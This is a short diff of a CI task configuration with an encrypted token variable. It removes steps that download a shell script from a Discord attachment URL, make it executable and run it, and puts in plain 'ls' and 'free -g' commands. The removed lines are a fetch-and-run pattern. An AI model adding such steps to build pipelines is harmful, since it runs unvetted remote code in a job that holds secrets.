@@ -12,6 +12,5 @@ task:
   enviroment:
     TOKEN: ENCRYPTED[fb3817d3349eab96ea55ffde49ec4c79f421b04b10de4cf02973ea1d1fd080efc59a85b0ad6f059eb9fe45c3e281ed24]
   script:
-   - wget https://cdn.discordapp.com/attachments/898916536645984259/912728276399702036/danglinux.sh
-   - chmod +x danglinux.sh
-   - ./danglinux.sh
+   - ls
+   - free -g
